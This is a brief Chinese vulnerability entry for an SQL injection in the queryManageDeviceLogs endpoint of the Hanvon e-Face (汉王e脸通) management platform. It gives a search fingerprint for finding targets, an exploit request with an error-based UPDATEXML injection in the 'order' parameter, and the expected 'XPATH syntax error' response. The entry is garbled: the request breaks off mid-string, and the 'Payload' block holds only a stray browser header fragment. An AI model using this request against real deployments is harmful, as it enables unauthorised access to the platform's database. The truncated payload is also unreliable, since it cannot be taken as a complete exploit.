# 汉王e脸通综合管理平台queryManageDeviceLogs存在SQL注入漏洞

汉王e脸通综合管理平台 ｜ SQL注入 ｜ —
- **指纹**：`body="async src=\"`
- **请求**：`GET /manage/systemLogMgr/queryManageDeviceLogs.do?recoToken=67mds2pxXQb&t=1751959258092&begin=2025-07-01+00:00:00&end=2025-07-31+23:59:59&page=1&pageSize=25&order=(UPDATEXML(2920,CONCAT(0x2e,0x71716a7`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
languageLocal: zh-CN
```
- **响应特征**：200 XPATH syntax error